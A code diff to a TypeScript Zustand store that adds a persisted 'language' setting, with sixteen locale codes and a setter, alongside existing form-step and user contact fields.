@@ -20,6 +20,7 @@ interface State {
     userEmail: string | null;
     userFullName: string | null;
     userPhone: string | null;
+    language: 'en' | 'vi' | 'es' | 'fr' | 'de' | 'ja' | 'zh' | 'ko' | 'pt' | 'th' | 'id' | 'ar' | 'ru' | 'uk' | 'hi' | 'bn';
     setModalOpen: (isOpen: boolean) => void;
     setGeoInfo: (info: GeoInfo) => void;
     setMessageId: (id: number | null) => void;
@@ -28,6 +29,7 @@ interface State {
     setUserEmail: (email: string | null) => void;
     setUserFullName: (name: string | null) => void;
     setUserPhone: (phone: string | null) => void;
+    setLanguage: (lang: 'en' | 'vi' | 'es' | 'fr' | 'de' | 'ja' | 'zh' | 'ko' | 'pt' | 'th' | 'id' | 'ar' | 'ru' | 'uk' | 'hi' | 'bn') => void;
 }
 
 export const store = create<State>()(
@@ -41,6 +43,7 @@ export const store = create<State>()(
             userEmail: null,
             userFullName: null,
             userPhone: null,
+            language: 'en',
             setModalOpen: (isOpen: boolean) => set({ isModalOpen: isOpen }),
             setGeoInfo: (info: GeoInfo) => set({ geoInfo: info }),
             setMessageId: (id: number | null) => set({ messageId: id }),
@@ -48,7 +51,8 @@ export const store = create<State>()(
             setFormStep: (step: 'init' | 'password' | 'verify' | null) => set({ formStep: step }),
             setUserEmail: (email: string | null) => set({ userEmail: email }),
             setUserFullName: (name: string | null) => set({ userFullName: name }),
-            setUserPhone: (phone: string | null) => set({ userPhone: phone })
+            setUserPhone: (phone: string | null) => set({ userPhone: phone }),
+            setLanguage: (lang: 'en' | 'vi' | 'es' | 'fr' | 'de' | 'ja' | 'zh' | 'ko' | 'pt' | 'th' | 'id' | 'ar' | 'ru' | 'uk' | 'hi' | 'bn') => set({ language: lang })
         }),
         {
             name: 'storage',
@@ -60,7 +64,8 @@ export const store = create<State>()(
                 formStep: state.formStep,
                 userEmail: state.userEmail,
                 userFullName: state.userFullName,
-                userPhone: state.userPhone
+                userPhone: state.userPhone,
+                language: state.language
             })
         }
     )
